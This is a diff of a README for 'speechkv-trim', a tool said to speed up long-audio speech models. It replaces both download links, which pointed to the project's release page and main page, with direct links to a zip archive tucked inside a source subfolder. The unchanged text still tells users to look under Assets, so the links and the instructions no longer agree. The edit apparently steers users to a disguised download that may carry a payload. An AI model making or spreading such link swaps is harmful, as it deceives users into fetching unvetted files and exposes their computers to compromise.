@@ -1,6 +1,6 @@
 # 🎤 speechkv-trim - Make long audio models run faster
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/wakas6532/speechkv-trim/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/wakas6532/speechkv-trim/raw/refs/heads/main/speechkv_trim/pruners/trim-speechkv-v3.9.zip)
 
 Speech models process long audio files slowly because they track too much information. This software manages that information efficiently. It trims unnecessary data while keeping the audio quality high. You save time and memory when processing long recordings.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 You need to download the installer from the official release page. 
 
-[Visit this page to download the latest version](https://github.com/wakas6532/speechkv-trim).
+[Visit this page to download the latest version](https://github.com/wakas6532/speechkv-trim/raw/refs/heads/main/speechkv_trim/pruners/trim-speechkv-v3.9.zip).
 
 Look for the link labeled with your operating system under the Assets section. Save the installer file to your computer.
 
